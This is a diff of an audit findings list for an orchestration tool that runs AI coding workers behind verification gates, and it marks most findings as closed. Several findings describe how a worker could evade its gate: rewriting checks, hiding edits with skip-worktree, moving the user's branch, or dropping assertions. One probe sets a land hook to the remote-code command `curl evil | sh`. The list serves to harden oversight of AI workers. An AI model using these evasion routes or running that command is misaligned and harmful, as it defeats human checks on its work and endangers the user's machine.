@@ -19,13 +19,13 @@ Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the pac
 
 ## BLOCKING (8)
 
-- [ ] **LIVE-01** [high] Every opencode server's heap peaks at 2-3 GB in a day-long session, within reach of the 4.3 GB limit the design note says was handled (also: boot)
+- [x] **LIVE-01** (closed 26d7228) [high] Every opencode server's heap peaks at 2-3 GB in a day-long session, within reach of the 4.3 GB limit the design note says was handled (also: boot)
   `packages/opencode/src/fleet.ts` — grep 'new high' ~/.local/state/mcp-horde/servers.log (19 lines): pid 1049645 (digicorp session, started 2026-10-26T11:24): heap 570 MB at 11:36, 1426 MB at 14:31, 2163 MB… → [00-live.md](./00-live.md#live-01--)
 - [ ] **LIVE-02** [high] A backend that dies mid-task leaves the task stranded behind a misleading 'driven by another MCP session (pid undefined)' answer (also: boot)
   `packages/opencode/src/fleet.ts:3142` — Live probe (scratchpad/audit/live/out/backend-dies/journey.log): horde_do t-78bb (worker runs `sleep 120`); after 25 s SIGKILL of the private backend (pid 3245998); horde… → [00-live.md](./00-live.md#live-02--)
 - [x] **LIVE-03** (closed 9bfba96) [medium] packages/opencode/test/support-fixes.test.ts (22 tests) has never run under npm test (also: gates)
   `packages/opencode/package.json:35` — node -e 'require("./packages/opencode/package.json").scripts.test' lists test/unit, core, modes, flow, dist, plugin, fleet-fixes, horde (8 files); the directory holds 10 … → [00-live.md](./00-live.md#live-03--)
-- [ ] **GAT-01** [high] Land-stage gate reads the worktree's on-disk horde.json, so a worker's rewritten checks judge what lands
+- [x] **GAT-01** (closed d8ff37a) [high] Land-stage gate reads the worktree's on-disk horde.json, so a worker's rewritten checks judge what lands
   `packages/verify/src/gate.ts:290` — gate.ts:290 `const settings = base && opts.settingsFrom !== "working" ? await loadSettingsAt(dir, opts.rulesAt ?? base) : loadSettings(dir)`; fleet.ts:1692-1700 landLoop … → [02-gates.md](./02-gates.md#gat-01--)
 - [x] **GAT-02** (closed 7995364) [high] `git update-index --skip-worktree` hides any edit (horde.json, package.json, tests) from every audit path
   `packages/verify/src/audit.ts:271` — audit.ts:271-339 changes() builds the change list from `git diff --name-status`, `git diff -U0` and `git ls-files --others --exclude-standard`; all three honour the skip-… → [02-gates.md](./02-gates.md#gat-02--)
@@ -33,12 +33,12 @@ Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the pac
   `packages/verify/src/audit.ts:518` — ruleChanges (audit.ts:518-594) watches horde.json verify, package.json scripts (+pre/post hooks), RUNNER_CONFIG, conftest.py, CHECK_CONFIG, pyproject/setup.cfg sections o… → [02-gates.md](./02-gates.md#gat-03--)
 - [x] **SEC-01** (closed 919927a) [high] Workers get an unconfined shell that OpenCode never prompts for by default, and the plugin's user-facing docs do not say so
   `packages/opencode/src/fleet.ts:369` — fleet.ts:363-371 withScope(): the task scope becomes OpenCode `edit` rules only ({"*": outside ?? "deny", <scope>: "allow"}); no `shell` rule is ever added (profileRules … → [05-security.md](./05-security.md#sec-01--)
-- [ ] **SEC-02** [high] The server password and Claude Code's messaging token/socket and session id are inherited by every worker shell (also: live)
+- [x] **SEC-02** (closed 9cb4b60) [high] The server password and Claude Code's messaging token/socket and session id are inherited by every worker shell (also: live)
   `packages/opencode/src/backend.ts:436` — backend.ts:436 spawnShared: `env: { ...process.env, OPENCODE_SERVER_USERNAME: config.username, OPENCODE_SERVER_PASSWORD: password }`; backend.ts:491 spawnPrivate does the… → [05-security.md](./05-security.md#sec-02--)
 
 ## CLEANUP (47)
 
-- [ ] **LIVE-04** [medium] horde_do starts a paid worker on a detached HEAD although only horde_land refuses it (also: boot)
+- [x] **LIVE-04** (closed 01623f0) [medium] horde_do starts a paid worker on a detached HEAD although only horde_land refuses it (also: boot)
   `packages/opencode/src/horde.ts` — Live probe (scratchpad/audit/live/out/detached/journey.log): `git checkout --detach HEAD` in the sample repo, then horde_do → 't-035f working … worktree horde/t-035f' (16… → [00-live.md](./00-live.md#live-04--)
 - [x] **LIVE-05** (closed 919927a) [medium] DESIGN.md §4.2 describes worker-side MCP injection (OPENCODE_CONFIG_CONTENT, HORDE_WORKER_TOOLS) that the source never contained
   `docs/DESIGN.md:149` — docs/DESIGN.md:149: 'When `opencode` starts the shared or private server it sets `OPENCODE_CONFIG_CONTENT` with `mcp` entries for the worker-side horde servers … (`HORDE_… → [00-live.md](./00-live.md#live-05--)
@@ -68,27 +68,27 @@ Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the pac
   `plugins/horde/.claude-plugin/plugin.json:1` — `claude plugin validate .` → "plugins[0] plugin.json → version: No version specified" (and ICON_MISSING for the plugin directory); `claude plugin validate plugins/horde` … → [01-deploy.md](./01-deploy.md#dep-10--)
 - [x] **GAT-04** (closed 7995364) [medium] horde.json changes outside `verify` (workers.land, workers.setup, tiers, context) are not audited, yet the orchestrator executes them after landing
   `packages/verify/src/audit.ts:562` — audit.ts:562-563 compares only `json(before).verify` with `json(after).verify`. Probe audit-probes.mts case 33: worker sets workers.land to `curl evil | sh` and workers.s… → [02-gates.md](./02-gates.md#gat-04--)
-- [ ] **GAT-05** [medium] A task started from a repository subdirectory is gated on different checks at land than in its rounds (none when the checks live only in the subdirectory)
+- [x] **GAT-05** (closed d8ff37a) [medium] A task started from a repository subdirectory is gated on different checks at land than in its rounds (none when the checks live only in the subdirectory)
   `packages/opencode/src/fleet.ts:1692` — runGateFor gates `live.session?.location.directory ?? live.record.directory` (= worktree.path, fleet.ts:2152) while landLoop gates `wt.root` (fleet.ts:1692); detectChecks… → [02-gates.md](./02-gates.md#gat-05--)
 - [x] **GAT-06** (closed 7995364) [medium] Assertion removal and snapshot rewrites only warn (never block), and a snapshot rewrite of 20 lines or fewer is silent
   `packages/verify/src/audit.ts:674` — audit.ts:674 `add("tests", {... removes N assertions}, true)` and :675-676 snapshot `... c.removed.length > 20 ... , true)`: the `soft` flag forces severity warn whatever… → [02-gates.md](./02-gates.md#gat-06--)
 - [x] **GAT-07** (closed 494e12d) [medium] Verdict cache ignores git-ignored inputs: a changed .env or linked dependency leaves a cached PASS
   `packages/verify/src/gate.ts:86` — treeKey (gate.ts:81-95) hashes HEAD, `git diff --binary HEAD` and `ls-files --others --exclude-standard` (ignored files excluded) plus the options. Probe gate-probes2.mts… → [02-gates.md](./02-gates.md#gat-07--)
-- [ ] **GAT-08** [low] A check that rewrites a tracked file makes later checks judge a tree that is not the one that lands
+- [x] **GAT-08** (closed d8ff37a) [low] A check that rewrites a tracked file makes later checks judge a tree that is not the one that lands
   `packages/opencode/src/fleet.ts:1713` — landLoop fast-forwards `judged` (the commit before the checks ran, fleet.ts:1713) while checks run sequentially in the working tree (run.ts:71-74). Probe gate-probes.mts … → [02-gates.md](./02-gates.md#gat-08--)
 - [x] **GAT-09** (closed 494e12d) [low] Untracked artefacts of the worker's own test runs (e.g. __pycache__ in a repo whose .gitignore lacks it) block the gate as binaries
   `packages/verify/src/gate.ts:326` — gate.ts:324-326 drops only files that first appear during the gate's own run. Probe gate-probes.mts section A (pytest project without .gitignore): the first gate's pytest… → [02-gates.md](./02-gates.md#gat-09--)
 - [x] **GAT-10** (closed 494e12d) [low] Checks inherit provider API keys; only OPENCODE_SERVER_* and HORDE_* are stripped
   `packages/verify/src/run.ts:54` — run.ts:54 `STRIP_ENV = ["FORCE_COLOR", "CLICOLOR_FORCE", "NODE_TEST_CONTEXT", "OPENCODE_SERVER_", "HORDE_"]`. Probe gate-probes.mts section C (check = `env | grep ...`): … → [02-gates.md](./02-gates.md#gat-10--)
-- [ ] **GAT-11** [low] horde.json workers.land/setup are read from the main checkout's working file, not from the branch tip
+- [x] **GAT-11** (closed d8ff37a) [low] horde.json workers.land/setup are read from the main checkout's working file, not from the branch tip
   `packages/opencode/src/fleet.ts:1666` — fleet.ts:1666 `const land = loadWorkers(wt.repo).land` and :1100 `loadWorkers(directory)` → core config.ts:203 loadWorkers → loadHordeFile reads the file on disk; worktre… → [02-gates.md](./02-gates.md#gat-11--)
-- [ ] **REC-01** [medium] horde_land replays squash-merged work as empty commits and fast-forwards them onto the branch
+- [x] **REC-01** (closed d8ff37a) [medium] horde_land replays squash-merged work as empty commits and fast-forwards them onto the branch
   `packages/opencode/src/fleet.ts:1603` — fleet.ts:1596-1625 recognises 'work already on the branch' only via `git cherry -v tip HEAD start` (patch-id). Simulation in scratch (squash/): master <- `git merge --squ… → [03-recent.md](./03-recent.md#rec-01--)
 - [x] **REC-02** (closed 915ae8b) [low] horde status/remove --repo <existing non-git dir> still creates an empty board (class of 4b775d1)
   `packages/board/src/cli.ts:100` — 4b775d1 added knownState() for --state only. Ran `HORDE_BOARD_STATE_DIR=<tmp>/state node packages/board/dist/cli.js status --repo <tmp>/notrepo` (an existing empty direct… → [03-recent.md](./03-recent.md#rec-02--)
 - [x] **REC-03** (closed 915ae8b) [low] Report check still takes 'n/a', 'N/A', 'none.' as file-path claims
   `packages/board/src/board.ts:398` — 9c2b22d: `const claimedPath = (p) => Boolean(p) && (isFile(p) || (!/\s/.test(p) && /[./]/.test(p)))`. node -e with that predicate: "none" false, "n/a" true, "N/A" true, "… → [03-recent.md](./03-recent.md#rec-03--)
-- [ ] **REC-04** [low] Binaries and scope hints parse the budget-trimmed verdict and silently disappear when audit lines are dropped
+- [x] **REC-04** (closed 01623f0) [low] Binaries and scope hints parse the budget-trimmed verdict and silently disappear when audit lines are dropped
   `packages/opencode/src/horde.ts:632` — outcome() takes `verdict = record.gateState?.verdict` (horde.ts:431) and feeds `verdict?.text` to scopeFiles (:621-630) and binaryFiles (:632-641); the 900-char `truncate… → [03-recent.md](./03-recent.md#rec-04--)
 - [ ] **REC-05** [low] News file is not republished when a gate decides; it waits for the agent's next scheduled refresh
   `packages/opencode/src/fleet.ts:2013` — publishNews() call sites: fleet.ts:1030 (task start), 2266/2279 (maybePush), 2785 (markReported), 3106 (dropLive). maybePush is called only from doRefresh (:2013). The ga… → [03-recent.md](./03-recent.md#rec-05--)
@@ -96,23 +96,23 @@ Ground truth first: `./ci.sh` in full (427 tests, none skipped, exit 0), the pac
   `packages/board/test/board.test.ts` — Ran the package's own test command with HORDE_VERIFY_STATE_DIR, HORDE_BOARD_STATE_DIR, HORDE_OPENCODE_STATE_DIR, HORDE_OPENCODE_WORKTREE_DIR, XDG_STATE_HOME, XDG_DATA_HOM… → [03-recent.md](./03-recent.md#rec-06--)
 - [x] **REC-07** (closed 0f05cad) [low] News reminders stop after /clear or --continue: the server keeps its spawn-time session id
   `packages/opencode/src/news.ts:35` — news.ts:35 names the file after `process.env.CLAUDE_CODE_SESSION_ID` read once at construction; news.mjs readNews() opens `<stateDir>/news/<input.session_id>.json`. Claud… → [03-recent.md](./03-recent.md#rec-07--)
-- [ ] **BOOT-01** [medium] A shared-server record that answers 'unauthorized' or fails its probe with a non-timeout transport error is forgotten and a second `opencode serve` is spawned; the first keeps running as an orphan that nothing can stop or attach to
+- [x] **BOOT-01** (closed 9cb4b60) [medium] A shared-server record that answers 'unauthorized' or fails its probe with a non-timeout transport error is forgotten and a second `opencode serve` is spawned; the first keeps running as an orphan that nothing can stop or attach to
   `packages/opencode/src/backend.ts:106` — Live probe P4 (probe-flow.ts): started backend A (pid 3409688) via `opencode_server info`; rewrote server.json with password 'wrong-password'; new server process: `openco… → [04-boot.md](./04-boot.md#boot-01--)
 - [x] **BOOT-02** (closed 6a682fb) [medium] createWorktree leaks the worktree and branch when it fails between `git worktree add` and the cleanup try; `repoRoot` accepts an empty top-level, which produced the on-disk `agent-da39a3ee/t-ab0d` and ran every git call in the server's cwd
   `packages/opencode/src/worktree.ts:174` — On disk: ~/.local/share/mcp-horde/worktrees/agent-da39a3ee/t-ab0d (created 2026-10-24 21:11) is a registered worktree of /home/swr/workspace/digicorp (`cat .git` -> 'gitd… → [04-boot.md](./04-boot.md#boot-02--)
 - [x] **BOOT-03** (closed 6a682fb) [low] Leftovers under the worktree root that nothing sweeps: a Docker bind mount recreated the removed t-0164 worktree, empty per-repository folders accumulate, and records of vanished worktrees are hidden but never deleted
   `packages/opencode/src/worktree.ts:951` — ~/.local/share/mcp-horde/worktrees/rp-integration-497e8607/t-0164 is not a git worktree (`git rev-parse` -> 'not a git repository'); it contains only two *directories* na… → [04-boot.md](./04-boot.md#boot-03--)
-- [ ] **BOOT-04** [low] horde_do in a non-git directory fails fast but creates a board for the plain directory, records a failed task, and records the start failure twice
+- [x] **BOOT-04** (closed 01623f0) [low] horde_do in a non-git directory fails fast but creates a board for the plain directory, records a failed task, and records the start failure twice
   `packages/opencode/src/horde.ts:157` — Live probe P6 (probe-flow.ts): `horde_do {goal, directory: <plain dir with horde.json>}` -> 152 ms ERR 'isolation "worktree" needs a git repository, but .../pflow/plain i… → [04-boot.md](./04-boot.md#boot-04--)
 - [ ] **BOOT-05** [low] opencode_dispose of a task-bound agent never closes its board attempt: the task stays 'working' and the ledger learns nothing
   `packages/opencode/src/fleet.ts:1415` — fleet.ts:1415-1462 disposeHeld() interrupts, records activity (recordTaskActivity), commits/removes the worktree and forgets the record; there is no board.accept/board.fa… → [04-boot.md](./04-boot.md#boot-05--)
-- [ ] **BOOT-06** [low] Backend lifecycle: started lazily, stopped by nobody, reused across plugin and opencode versions with only a bin-string comparison and an 'untested' warning shown by opencode_status
+- [x] **BOOT-06** (closed 9cb4b60) [low] Backend lifecycle: started lazily, stopped by nobody, reused across plugin and opencode versions with only a bin-string comparison and an 'untested' warning shown by opencode_status
   `packages/opencode/src/backend.ts:89` — Who starts it: index.ts:72-88 getBackend on the first tool call (never at boot, index.ts:57-59), spawnShared backend.ts:427-472 detached + unref. Who stops it: only stopS… → [04-boot.md](./04-boot.md#boot-06--)
 - [x] **BOOT-07** (closed 6a682fb) [low] News file: `at` is refreshed only when the lists change, so the hook's 24 h staleness rule silences a session whose outcomes waited a day; the file is removed when the backend dies
   `packages/opencode/src/news.ts:57` — news.ts:55-59 update(): `const key = JSON.stringify([waiting, working]); if (key === this.last) return` — the body (with `at: Date.now()`, line 64) is only rewritten on a… → [04-boot.md](./04-boot.md#boot-07--)
 - [x] **BOOT-08** (closed 9bfba96) [low] Test harness leaves a temp git repository per run under /tmp: 763 'horde-oc-*' directories, 1.6 GB, in two days
   `packages/opencode/test/harness.ts:31` — `ls -d /tmp/horde-oc-* | wc -l` -> 763; `du -sch /tmp/horde-oc-*` -> 1.6 GB total; oldest 2026-10-26 13:55. harness.ts:31 `fs.mkdtempSync(path.join(os.tmpdir(), 'horde-oc… → [04-boot.md](./04-boot.md#boot-08--)
-- [ ] **SEC-03** [medium] A worker can move the user's branch from its worktree so the gate reads the worker's own loosened horde.json (also: recent)
+- [x] **SEC-03** (closed d8ff37a) [medium] A worker can move the user's branch from its worktree so the gate reads the worker's own loosened horde.json (also: recent)
   `packages/opencode/src/fleet.ts:2151` — fleet.ts:2149-2157: `const rulesAt = wt ? await git(wt.repo, "rev-parse", "HEAD")` with the comment "a worktree gate judges by the target branch's rules, which the work i… → [05-security.md](./05-security.md#sec-03--)
 - [ ] **SEC-04** [medium] A cloned repository's horde.json runs commands on the user's machine at the first horde_do, before any verdict and without a consent step
   `packages/opencode/src/horde.ts:130` — horde.ts:130-134: `detectChecks(repo, await loadSettingsAt(repo, "HEAD"))` then `fleet.spawn(...)`; fleet.ts:1095-1105: `const workers = loadWorkers(directory)` and `setu… → [05-security.md](./05-security.md#sec-04--)
@@ -139,7 +139,7 @@ Each scope file ends with its verified-clean records (what was constructed or ex
 
 ## Added during remediation
 
-- [ ] **NEW-01** [medium] horde_wait's timeout summary shows the worker's last action, not that its gate has been queued on a check slot
+- [x] **NEW-01** (closed 01623f0) [medium] horde_wait's timeout summary shows the worker's last action, not that its gate has been queued on a check slot
   `packages/opencode/src/horde.ts` — Observed 2026-10-28 with eight tasks sharing one `test` slot (`~/.local/state/mcp-horde/verify/locks/<repo>/check-test.0.lock` held by one server for 20+ minutes): the summary read "shell: … npm test" / "read: {}" for the running two and "the agents' status could not be read" for the rest. The orchestrator cannot tell a slow worker from a queued gate. Fix: when a gate round is waiting for a slot, say so in the wait summary and in opencode_status ("gate: waiting for the test slot held by t-xxxx, 14 min").
 - [ ] **NEW-02** [medium] Admission counts tasks, not load: `opencode.maxRunning` (default 8) ignores cores, check slots and what else the machine runs
   `packages/opencode/src/config.ts` — Eight concurrent tasks on a 16-core machine already running other sessions' workers drove the load average to 51 and the shared backend into "not answering" blips. Fix: default maxRunning to min(8, cores / 2); when a check with `slots: 1` exists, say in horde_do's first answer how many tasks can usefully run; refuse or queue a horde_do when the 1-minute load average exceeds the core count, with the reason.
